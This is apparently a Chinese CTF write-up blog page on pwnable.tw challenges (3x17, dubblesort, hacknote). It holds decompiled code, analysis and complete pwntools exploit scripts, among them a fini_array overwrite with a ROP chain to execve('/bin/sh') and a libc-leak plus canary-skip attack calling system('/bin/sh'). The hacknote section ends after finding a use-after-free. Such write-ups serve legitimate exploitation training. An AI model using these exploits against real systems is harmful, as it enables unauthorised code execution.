+<p>一道64位静态链接的题目，尽管check说是没有canary保护，但是放入ida中可以看到还是有canary保护的。这道题去除了符号表，因此先运行一下程序，方便找一下main函数在哪</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">haoo@LAPTOP-QH6DKIQF:/mnt/d/pwnable_tw$ ./3x17<br>addr:111<br>data:111<br></code></pre></td></tr></table></figure>
+
+<p>ok。这样就好找到主函数了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">__int64 sub_401B6D()<br>&#123;<br>  __int64 result; // rax<br>  char *buf_1; // [rsp+8h] [rbp-28h]<br>  char buf[24]; // [rsp+10h] [rbp-20h] BYREF<br>  unsigned __int64 v3; // [rsp+28h] [rbp-8h]<br><br>  v3 = __readfsqword(0x28u);<br>  result = (unsigned __int8)++byte_4B9330;<br>  if ( byte_4B9330 == 1 )<br>  &#123;<br>    sub_446EC0(1u, &quot;addr:&quot;, 5u);<br>    sub_446E20(0, buf, 0x18u);<br>    buf_1 = (char *)(int)sub_40EE70(buf);<br>    sub_446EC0(1u, &quot;data:&quot;, 5u);<br>    sub_446E20(0, buf_1, 0x18u);<br>    result = 0;<br>  &#125;<br>  if ( __readfsqword(0x28u) != v3 )<br>    sub_44A3E0();<br>  return result;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>确实也是有canary保护检测的。这个看起来像是任意地址写。由于sub_40EE70(buf)函数实在是太长了，在这里就不放出来了，让ai分析一下，可以知道大致就是一个atoll的功能，将十进制数转换为8字节地址，接着就是向这个地址输入0x18字节的数据。</p>
+<p>现在就是思考在没有给出栈地址和&#x2F;bin&#x2F;sh的情况下，如何利用这一次任意地址写。我们知道在程序中main并不是开始，而是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">程序启动——__libc_start_main——__libc_csu_init()——调用顺序（_init_array[0..n]）——main()——__libc_csu_fini()——调用顺序（_fini_array[n..0]）<br></code></pre></td></tr></table></figure>
+
+<p>那么是不是可以修改_fini_array中的函数为我们想要的函数，就能够控制执行流了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.fini_array:00000000004B40F0 ; ===========================================================================<br>.fini_array:00000000004B40F0<br>.fini_array:00000000004B40F0 ; Segment type: Pure data<br>.fini_array:00000000004B40F0 ; Segment permissions: Read/Write<br>.fini_array:00000000004B40F0 _fini_array     segment qword public &#x27;DATA&#x27; use64<br>.fini_array:00000000004B40F0                 assume cs:_fini_array<br>.fini_array:00000000004B40F0                 ;org 4B40F0h<br>.fini_array:00000000004B40F0 off_4B40F0      dq offset sub_401B00    ; DATA XREF: sub_4028D0+4C↑o<br>.fini_array:00000000004B40F0                                         ; sub_402960+8↑o<br>.fini_array:00000000004B40F8                 dq offset loc_401580<br>.fini_array:00000000004B40F8 _fini_array     ends<br>.fini_array:00000000004B40F8<br></code></pre></td></tr></table></figure>
+
+<p>有两个8字节大小够我们操作，那么一个写入main，一个写入__libc_csu_fini()，从而理论上实现任意地址写。</p>
+<p>由于这道题是静态链接且什么都没给的情况下，想法就是构造execve(“&#x2F;bin&#x2F;sh”,0,0)，而这道题又没给&#x2F;bin&#x2F;sh字符串，就得要找到一个地方写入ROP链并且能够执行这段ROP链，这里想到的就是栈迁移。在__libc_csu_fini()汇编里面观察一下，发现会将0x4B40F0赋值给rbp，而这个地址就是fini_array</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.text:0000000000402960 ; =============== S U B R O U T I N E =======================================<br>.text:0000000000402960<br>.text:0000000000402960<br>.text:0000000000402960 sub_402960      proc near               ; DATA XREF: start+F↑o<br>.text:0000000000402960 ; __unwind &#123;<br>.text:0000000000402960                 push    rbp<br>.text:0000000000402961                 lea     rax, unk_4B4100<br>.text:0000000000402968                 lea     rbp, off_4B40F0<br>.text:000000000040296F                 push    rbx<br>.text:0000000000402970                 sub     rax, rbp<br>.text:0000000000402973                 sub     rsp, 8<br>.text:0000000000402977                 sar     rax, 3<br>.text:000000000040297B                 jz      short loc_402996<br>.text:000000000040297D                 lea     rbx, [rax-1]<br>.text:0000000000402981                 nop     dword ptr [rax+00000000h]<br>.text:0000000000402988<br>.text:0000000000402988 loc_402988:                             ; CODE XREF: sub_402960+34↓j<br>.text:0000000000402988                 call    qword ptr [rbp+rbx*8+0]<br>.text:000000000040298C                 sub     rbx, 1<br>.text:0000000000402990                 cmp     rbx, 0FFFFFFFFFFFFFFFFh<br>.text:0000000000402994                 jnz     short loc_402988<br>.text:0000000000402996<br>.text:0000000000402996 loc_402996:                             ; CODE XREF: sub_402960+1B↑j<br>.text:0000000000402996                 add     rsp, 8<br>.text:000000000040299A                 pop     rbx<br>.text:000000000040299B                 pop     rbp<br>.text:000000000040299C                 jmp     _term_proc<br>.text:000000000040299C ; &#125; // starts at 402960<br>.text:000000000040299C sub_402960      endp<br>.text:000000000040299C<br>.text:000000000040299C ; ---------------------------------------------------------------------------<br></code></pre></td></tr></table></figure>
+
+<p>如果在此时直接leave;ret;的话，rsp就会是0x4B4100</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.data.rel.ro:00000000004B4100 ; ===========================================================================<br>.data.rel.ro:00000000004B4100<br>.data.rel.ro:00000000004B4100 ; Segment type: Pure data<br>.data.rel.ro:00000000004B4100 ; Segment permissions: Read/Write<br>.data.rel.ro:00000000004B4100 _data_rel_ro    segment align_32 public &#x27;DATA&#x27; use64<br>.data.rel.ro:00000000004B4100                 assume cs:_data_rel_ro<br>.data.rel.ro:00000000004B4100                 ;org 4B4100h<br>.data.rel.ro:00000000004B4100 unk_4B4100      db    2                 ; DATA XREF: sub_402960+1↑o<br>.data.rel.ro:00000000004B4100                                         ; sub_40EBF0:loc_40ECC8↑o ...<br></code></pre></td></tr></table></figure>
+
+<p>这是一段rel.ro，也就是说只读，但是呢用readelf -S .&#x2F;3x17这条命令来看，这段是可写的，那就好了，下面只需要构造好内容再栈迁移就行了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#导入所需库<br>#--------------------------------------------------------------------------------<br>from pwn import*<br>from LibcSearcher import*<br>from ctypes import*<br>from struct import*<br>import time<br><br>#设置context<br>#--------------------------------------------------------------------------------<br>context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])<br><br>#设置是否本地还是远程,并操作、解析相应文件<br>#--------------------------------------------------------------------------------<br>pwn_file=&#x27;./3x17&#x27;<br>#libc_file=&#x27;&#x27;<br>#elf=ELF(&#x27;./start&#x27;)<br>#libc=ELF(libc_file)<br>#rop=ROP(libc)<br><br>flag=1<br>if flag:<br>    io=process(pwn_file)<br>else:<br>    ip=&#x27;chall.pwnable.tw&#x27;<br>    port=10105<br>    io=remote(ip,port)<br><br>#设置自定义函数<br>#--------------------------------------------------------------------------------<br>#gdb调试<br>def debug():<br>    #gdb.attach(io)<br>    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)<br>    #gdb.attach(io,&#x27;b main&#x27;)<br>    pause()<br>#lambda表达式<br><br>s 		= 	lambda data 				: io.send(data)<br>sa 		= 	lambda delim,data 			: io.sendafter(str(delim), data)<br>sl 		= 	lambda data 				: io.sendline(data)<br>sla 	= 	lambda delim,data 			: io.sendlineafter(str(delim), data)<br>r 		= 	lambda num 					: io.recv(num)<br>rl		=	lambda 						: io.recvline()<br>ru 		= 	lambda delims, drop = True 	: io.recvuntil(delims, drop)<br>leak 	= 	lambda name,addr 			: log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))<br>ur32 	= 	lambda data					: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))<br>ur64 	= 	lambda data 				: u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))<br>uu64    = 	lambda data 				: u64(data.ljust(8,b&#x27;\x00&#x27;))<br>uul32 	= 	lambda 						: u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))<br>uul64 	= 	lambda 						: u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>i32		=	lambda data					: int(io.recv(data), 16)<br>i64		=	lambda data					: int(io.recv(data), 16)<br>ioi     =   lambda                      : io.interactive()<br><br>#获取libc函数地址<br>def libc_func_addr(base,func):<br>    return base+libc.sym[&#x27;func&#x27;]<br>#简单的shellcode+orw<br>def shell():<br>    return asm(shellcraft.sh())<br>def orw(flag_file_name,addr,count):<br>    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))<br><br>#gdb.attach(io)<br>def dd(addr, data):<br>    sa(&quot;addr:&quot;,str(addr))<br>    sa(&quot;data:&quot;,data)<br>fini_addr = 0x00000000004B40F0 <br>main_addr = 0x0000000000401B6D<br>libc_csu_fini = 0x0000000000402960<br><br>pop_rdi = 0x0000000000401696<br>pop_rsi = 0x0000000000406c30<br>pop_rdx = 0x0000000000446e35<br>pop_rax = 0x000000000041e4af<br>syscall = 0x00000000004022b4<br>leave_ret = 0x0000000000401c4b<br><br>dd(fini_addr, p64(libc_csu_fini)+p64(main_addr))<br><br>dd(fini_addr+0x10,p64(pop_rdi)+p64(fini_addr+0x58))<br>dd(fini_addr+0x20,p64(pop_rsi)+p64(0))<br>dd(fini_addr+0x30,p64(pop_rdx)+p64(0))<br>dd(fini_addr+0x40,p64(pop_rax)+p64(59))<br>dd(fini_addr+0x50,p64(syscall))<br>dd(fini_addr+0x58,b&quot;/bin/sh\x00&quot;)<br><br>dd(fini_addr,p64(leave_ret))<br>#连接<br>#--------------------------------------------------------------------------------<br>ioi()<br></code></pre></td></tr></table></figure>
+
+<h1 id="dubblesort"><a href="#dubblesort" class="headerlink" title="dubblesort"></a>dubblesort</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">haoo@LAPTOP-QH6DKIQF:/mnt/d/pwnable_tw$ checksec dubblesort<br>[*] &#x27;/mnt/d/pwnable_tw/dubblesort&#x27;<br>    Arch:       i386-32-little<br>    RELRO:      Full RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        PIE enabled<br>    FORTIFY:    Enabled<br></code></pre></td></tr></table></figure>
+
+<p>看起来保护是全开了的，应该是有点难度，给了我们libc文件，patchelf一下，运行一下这个程序</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[+] Opening connection to chall.pwnable.tw on port 10101: Done<br>[*] Switching to interactive mode<br>What your name :$ haoo<br>Hello haoo<br>O\xbc\xff/,How many numbers do you what to sort :$ 4<br>Enter the 0 number : $ 1<br>Enter the 1 number : $ 2<br>Enter the 2 number : $ 3<br>Enter the 3 number : $ 4<br>Processing......<br>Result :<br>1 2 3 4 [*] Got EOF while reading in interactive<br>$ <br></code></pre></td></tr></table></figure>
+
+<p>可以大致知道，这道题先输入名字，再输入数字进行排序。放入ida中进行分析一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">int __cdecl main(int argc, const char **argv, const char **envp)<br>&#123;<br>  int v3; // eax<br>  unsigned int *v4; // edi<br>  unsigned int i; // esi<br>  unsigned int j; // esi<br>  int result; // eax<br>  unsigned int v8; // [esp+18h] [ebp-74h] BYREF<br>  unsigned int v9[8]; // [esp+1Ch] [ebp-70h] BYREF<br>  _BYTE buf[64]; // [esp+3Ch] [ebp-50h] BYREF<br>  unsigned int v11; // [esp+7Ch] [ebp-10h]<br><br>  v11 = __readgsdword(0x14u);<br>  sub_8B5();<br>  __printf_chk(1, (int)&quot;What your name :&quot;);<br>  read(0, buf, 0x40u);<br>  __printf_chk(1, (int)&quot;Hello %s,How many numbers do you what to sort :&quot;);<br>  __isoc99_scanf(&quot;%u&quot;, &amp;v8);<br>  v3 = v8;<br>  if ( v8 )<br>  &#123;<br>    v4 = v9;<br>    for ( i = 0; i &lt; v8; ++i )<br>    &#123;<br>      __printf_chk(1, (int)&quot;Enter the %d number : &quot;);<br>      fflush(stdout);<br>      __isoc99_scanf(&quot;%u&quot;, v4);<br>      v3 = v8;<br>      ++v4;<br>    &#125;<br>  &#125;<br>  sub_931(v9, v3);<br>  puts(&quot;Result :&quot;);<br>  if ( v8 )<br>  &#123;<br>    for ( j = 0; j &lt; v8; ++j )<br>      __printf_chk(1, (int)&quot;%u &quot;);<br>  &#125;<br>  result = 0;<br>  if ( __readgsdword(0x14u) != v11 )<br>    sub_BA0();<br>  return result;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>从运行可以看到，在输出name的同时会输出一些别的东西，那么就说明可以泄漏一些东西，比如libc基址，通过动调后，可以写入下面这个泄漏脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">sl(b&quot;a&quot;*28)<br>io.recvuntil(b&quot;a&quot;*28)<br>libc_base = u32(io.recv(4))-0x1b000a<br>leak(&quot;libc_base&quot;, libc_base)<br>[+] Opening connection to chall.pwnable.tw on port 10101: Done<br>[+] libc_base = 0xf75c3000<br>[*] Switching to interactive mode<br>\x01\xc6_V\xa9\xc7_V\xa0\xdf_V\x01,How many numbers do you what to sort :$  <br></code></pre></td></tr></table></figure>
+
+<p>ok，泄楼完成后就能得到很多东西了。现在就有一个问题，就是有了这些东西后，怎么绕过canary保护并覆盖返回地址。那就看一下这段代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">if ( v8 )<br> &#123;<br>   v4 = v9;<br>   for ( i = 0; i &lt; v8; ++i )<br>   &#123;<br>     __printf_chk(1, (int)&quot;Enter the %d number : &quot;);<br>     fflush(stdout);<br>     __isoc99_scanf(&quot;%u&quot;, v4);<br>     v3 = v8;<br>     ++v4;<br>   &#125;<br> &#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里有一点是很重要的就是并不是所有非法输入都会导致scanf卡死，可以通过+、-跳过当前这一轮的输入，因为v4是edi指针，每读到一个数据，这个指针就会下移继续读取下一个，没有检测scanf的返回值，那么就可以通过输入+、-来跳过对canary地址处的数据输入。得再注意一下排序就行了。exp如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#导入所需库<br>#--------------------------------------------------------------------------------<br>from pwn import*<br>from LibcSearcher import*<br>from ctypes import*<br>from struct import*<br>import time<br><br>#设置context<br>#--------------------------------------------------------------------------------<br>context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;) #log_level=&#x27;debug&#x27;)#, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])<br><br>#设置是否本地还是远程,并操作、解析相应文件<br>#--------------------------------------------------------------------------------<br>pwn_file=&#x27;./dubblesort&#x27;<br>libc_file=&#x27;./dubblesort_libc.so.6&#x27;<br>elf=ELF(&#x27;./dubblesort&#x27;)<br>libc=ELF(libc_file)<br>#rop=ROP(libc)<br><br>flag=0<br>if flag:<br>    io=process(pwn_file)<br>else:<br>    ip=&#x27;chall.pwnable.tw&#x27;<br>    port=10101<br>    io=remote(ip,port)<br><br>#设置自定义函数<br>#--------------------------------------------------------------------------------<br>#gdb调试<br>def debug():<br>    #gdb.attach(io)<br>    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)<br>    #gdb.attach(io,&#x27;b main&#x27;)<br>    pause()<br>#lambda表达式<br><br>s 		= 	lambda data 				: io.send(data)<br>sa 		= 	lambda delim,data 			: io.sendafter(str(delim), data)<br>sl 		= 	lambda data 				: io.sendline(data)<br>sla 	= 	lambda delim,data 			: io.sendlineafter(str(delim), data)<br>r 		= 	lambda num 					: io.recv(num)<br>rl		=	lambda 						: io.recvline()<br>ru 		= 	lambda delims, drop = True 	: io.recvuntil(delims, drop)<br>leak 	= 	lambda name,addr 			: log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))<br>ur32 	= 	lambda data					: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))<br>ur64 	= 	lambda data 				: u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))<br>uu64    = 	lambda data 				: u64(data.ljust(8,b&#x27;\x00&#x27;))<br>uul32 	= 	lambda 						: u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))<br>uul64 	= 	lambda 						: u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>i32		=	lambda data					: int(io.recv(data), 16)<br>i64		=	lambda data					: int(io.recv(data), 16)<br>ioi     =   lambda                      : io.interactive()<br><br>#获取libc函数地址<br>def libc_func_addr(base,func):<br>    return base+libc.sym[&#x27;func&#x27;]<br>#简单的shellcode+orw<br>def shell():<br>    return asm(shellcraft.sh())<br>def orw(flag_file_name,addr,count):<br>    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))<br><br>sl(b&quot;a&quot;*28)<br>io.recvuntil(b&quot;a&quot;*28)<br>libc_base = u32(io.recv(4))-0x1b000a<br>leak(&quot;libc_base&quot;, libc_base)<br><br>bin_sh = libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))<br>system = libc_base + libc.sym[&#x27;system&#x27;]<br><br>sl(b&quot;35&quot;)<br><br>for i in range(24):<br>    sl(&quot;1&quot;)<br><br>sl(b&quot;+&quot;)<br><br>for i in range(9):<br>    sl(str(system).encode())<br>sl(str(bin_sh).encode())<br>#连接<br>#--------------------------------------------------------------------------------<br>ioi()<br></code></pre></td></tr></table></figure>
+
+<h1 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">haoo@LAPTOP-QH6DKIQF:/mnt/d/pwnable_tw$ checksec hacknote<br>[*] &#x27;/mnt/d/pwnable_tw/hacknote&#x27;<br>    Arch:       i386-32-little<br>    RELRO:      Partial RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x8048000)<br>haoo@LAPTOP-QH6DKIQF:/mnt/d/pwnable_tw$ strings ./hacknote_libc.so.6 | grep ubuntu<br>GNU C Library (Ubuntu GLIBC 2.23-0ubuntu5) stable release version 2.23, by Roland McGrath et al.<br>&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.<br></code></pre></td></tr></table></figure>
+
+<p>一道32位题目，给了libc文件，先patchelf一下，放入ida中进行分析</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">void __noreturn main()<br>&#123;<br>  int n2; // eax<br>  char buf[4]; // [esp+8h] [ebp-10h] BYREF<br>  unsigned int v2; // [esp+Ch] [ebp-Ch]<br><br>  v2 = __readgsdword(0x14u);<br>  setvbuf(stdout, 0, 2, 0);<br>  setvbuf(stdin, 0, 2, 0);<br>  while ( 1 )<br>  &#123;<br>    while ( 1 )<br>    &#123;<br>      menu();<br>      read(0, buf, 4u);<br>      n2 = atoi(buf);<br>      if ( n2 != 2 )<br>        break;<br>      Delete();<br>    &#125;<br>    if ( n2 &gt; 2 )<br>    &#123;<br>      if ( n2 == 3 )<br>      &#123;<br>        Print();<br>      &#125;<br>      else<br>      &#123;<br>        if ( n2 == 4 )<br>          exit(0);<br>LABEL_13:<br>        puts(&quot;Invalid choice&quot;);<br>      &#125;<br>    &#125;<br>    else<br>    &#123;<br>      if ( n2 != 1 )<br>        goto LABEL_13;<br>      Add();<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>一道典型的堆菜单题目，有申请、删除、输出三个功能，看一下delete函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">unsigned int Delete()<br>&#123;<br>  int n5; // [esp+4h] [ebp-14h]<br>  char buf[4]; // [esp+8h] [ebp-10h] BYREF<br>  unsigned int v3; // [esp+Ch] [ebp-Ch]<br><br>  v3 = __readgsdword(0x14u);<br>  printf(&quot;Index :&quot;);<br>  read(0, buf, 4u);<br>  n5 = atoi(buf);<br>  if ( n5 &lt; 0 || n5 &gt;= ::n5 )<br>  &#123;<br>    puts(&quot;Out of bound!&quot;);<br>    _exit(0);<br>  &#125;<br>  if ( *(&amp;ptr + n5) )<br>  &#123;<br>    free(*((void **)*(&amp;ptr + n5) + 1));<br>    free(*(&amp;ptr + n5));<br>    puts(&quot;Success&quot;);<br>  &#125;<br>  return __readgsdword(0x14u) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>只是free了，并没有将指针置空，存在UAF漏洞可以利用，再看一下申请的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">unsigned int Add()<br>&#123;<br>  int v0; // ebx<br>  int n4; // [esp+Ch] [ebp-1Ch]<br>  int size; // [esp+10h] [ebp-18h]<br>  char buf[8]; // [esp+14h] [ebp-14h] BYREF<br>  unsigned int v5; // [esp+1Ch] [ebp-Ch]<br><br>  v5 = __readgsdword(0x14u);<br>  if ( n5 &lt;= 5 )<br>  &#123;<br>    for ( n4 = 0; n4 &lt;= 4; ++n4 )<br>    &#123;<br>      if ( !*(&amp;ptr + n4) )<br>      &#123;<br>        *(&amp;ptr + n4) = malloc(8u);<br>        if ( !*(&amp;ptr + n4) )<br>        &#123;<br>          puts(&quot;Alloca Error&quot;);<br>          exit(-1);<br>        &#125;<br>        *(_DWORD *)*(&amp;ptr + n4) = puts_w;<br>        printf(&quot;Note size :&quot;);<br>        read(0, buf, 8u);<br>        size = atoi(buf);<br>        v0 = (int)*(&amp;ptr + n4);<br>        *(_DWORD *)(v0 + 4) = malloc(size);<br>        if ( !*((_DWORD *)*(&amp;ptr + n4) + 1) )<br>        &#123;<br>          puts(&quot;Alloca Error&quot;);<br>          exit(-1);<br>        &#125;<br>        printf(&quot;Content :&quot;);<br>        read(0, *((void **)*(&amp;ptr + n4) + 1), size);<br>        puts(&quot;Success !&quot;);<br>        ++n5;<br>        return __readgsdword(0x14u) ^ v5;<br>      &#125;<br>    &#125;<br>  &#125;<br>  else<br>  &#123;<br>    puts(&quot;Full&quot;);<br>  &#125;<br>  return __readgsdword(0x14u) ^ v5;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+        </div>
+
+        
+          <aside class="toc-panel" aria-label="文章目录">
+            <div class="toc-panel__head">
+              <h2>目录</h2>
+              <button class="toc-top" type="button">顶部</button>
+            </div>
+            <nav id="toc"></nav>
+          </aside>
+        
+      </div>
+
+      <nav class="article-nav" aria-label="文章导航">
+        
+          <a href="/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%8F%B7/">
+            <span>上一篇</span>
+            <strong>系统调用号</strong>
+          </a>
+        
+        
+          <a href="/MoeCTF-2025/">
+            <span>下一篇</span>
+            <strong>MoeCTF_2025</strong>
+          </a>
+        
+      </nav>
+    </article>
+  </main>
+
+  <footer class="site-footer">
+  <div class="site-footer__inner">
+    <p><strong>haoo&#39;s tech blog</strong><span aria-hidden="true"> / </span>31 篇记录<span aria-hidden="true"> / </span><a href="/rss.xml">RSS</a></p>
+    <p>&copy; haoo · powered by Hexo</p>
+  </div>
+</footer>
+<dialog
+  id="command-console"
+  class="command-console"
+  aria-labelledby="command-title"
+  data-search-url="/search.json"
+  data-home-url="/"
+  data-categories-url="/categories"
+  data-tags-url="/tags"
+  data-about-url="/about"
+  data-links-url="/links"
+>
+  <div class="command-console__bar">
+    <div>
+      <span class="command-console__status" aria-hidden="true"></span>
+      <strong id="command-title">haoo@blog:~</strong>
+    </div>
+    <button class="command-console__close" type="button" data-command-close aria-label="关闭命令行">ESC</button>
+  </div>
+
+  <div id="command-output" class="command-console__output" role="log" aria-live="polite" aria-relevant="additions">
+    <div class="command-message command-message--accent">Startrace interactive shell v1.0</div>
+    <div class="command-message">输入 <code>help</code> 查看命令，按 <kbd>Ctrl K</kbd> 随时打开。</div>
+  </div>
+
+  <form id="command-form" class="command-console__form" autocomplete="off">
+    <label for="command-input"><span aria-hidden="true">visitor@blog:~$</span><span class="visually-hidden">输入命令</span></label>
+    <input id="command-input" name="command" type="text" inputmode="text" autocapitalize="off" spellcheck="false" aria-describedby="command-hint">
+    <span class="command-console__cursor" aria-hidden="true"></span>
+  </form>
+  <p id="command-hint" class="command-console__hint">help · ls · cd · open · search · clear</p>
+</dialog>
+
+<script src="/js/theme.js" defer></script>
+
+</body>
+</html>
